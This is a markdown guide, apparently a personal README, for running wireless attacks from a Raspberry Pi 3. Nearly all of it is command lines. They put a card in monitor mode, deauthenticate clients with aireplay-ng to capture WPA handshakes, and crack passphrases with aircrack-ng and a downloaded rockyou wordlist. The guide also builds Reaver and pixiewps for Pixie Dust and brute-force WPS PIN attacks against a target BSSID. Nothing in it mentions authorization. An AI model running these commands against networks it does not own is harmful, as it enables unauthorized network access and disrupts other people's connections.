# Raspberry Pi 3 Wireless Security Basic SETUP


## Step 1.0 | Getting Started | Tmux

Install it
```
$ sudo apt-get install tmux
```

Start new with session name
```
$ tmux new -s workingStationName
```

List sessions
```
tmux ls
```

kill session
```
tmux kill-session -t workingStationName
```

Go to current session
```
tmux a -t workingStationName
```


## Step 1.1 | Getting Started | aircrack-ng         
Install it, easy
```
$ sudo apt-get install aircrack-ng
```

Turn your Wireless to work with airmon-ng
```
$ sudo airmon-ng start wlan1
```

Kill any additional software that can disturbed `airmon-ng` performance
```
$ sudo airmon-ng check kill
```

Start `airodump-ng` to look out for networks
```
$ sudo airodump-ng mon0  
```

Start a new `tmux` session
```
$ tmux new -s ESSIDname_WPA
```

Sniffing IVs, ESSID (network name)
```
$ sudo airodump-ng -c 1 -w COLON --bssid 00:90:4C:C1:AC:21 mon0  
```

Start a new `tmux` session
```
$ tmux new -s ESSIDname_WPA_handshake
```

Get a WPA handshake, inside `ESSIDname_WPA_handshake` session
```
$ aireplay-ng -0 0 -a 00:90:4C:C1:AC:21 mon0
```

After the WPA handshake, get a Wordlists text
```
$ wget http://scrapmaker.com/data/wordlists/dictionaries/rockyou.txt
$ open https://wiki.skullsecurity.org/Passwords
```

Or wordlist generator
```
$ sudo apt-get install crunch
```

Start a new `tmux` session
```
$ tmux new -s ESSIDname_passphrase
```

Find the passphrase, inside the `ESSIDname_passphrase` session, max wait 44hr
```
$ sudo aircrack-ng -w rockyou.txt -b 00:90:4C:C1:AC:21 ESSIDname-*.cap
```



## Step 1.2 | Getting Started | Pixie Dust WPS attack with Raver and wash

Getting the System Ready
```
$ sudo apt-get update
$ sudo apt-get install build-essential libsqlite3-dev libpcap-dev sqlite3
```

Download Pixie Dust
```
$ wget https://github.com/wiire/pixiewps/archive/master.zip && unzip master.zip
```

Build it and Install Pixie Dust
```
$ cd pixiewps*/
$ cd src/
$ sudo make
$ sudo make install
$ cd ~
$ rm master.zip
$ sudo mv /usr/local/usr/bin/pixiewps /usr/local/bin
```

Download `Reaver v1.5.3`
```
$ wget https://github.com/t6x/reaver-wps-fork-t6x/archive/master.zip && unzip master.zip
```

Build it and Install `Reaver v1.5.3`
```
$ cd reaver-wps-fork-t6x-master/
$ cd src/
$ ./configure
$ sudo make
$ sudo make install
$ cd ~
$ sudo rm master.zip
```

Start airmon-ng
```
$ sudo airmon-ng start wlan1
```

Find access points
```
$ wash -i mon0
```

Start the Pixie Dust WPS attack
```
$ sudo reaver -i mon0 -b 00:90:4C:C1:AC:21 -c 11 -vvv -K 1 -f
```


## Step 1.3 | Getting Started | Wash + Reaver

See the vulnerability to attack
```
sudo wash -i mon0
```

Start new with session
```
$ tmux new -s ESSIDname_8Pin_Attact
```

Start the cracking
```
$ sudo reaver -i mon0 -b 00:90:4C:C1:AC:21 -vv -L
```
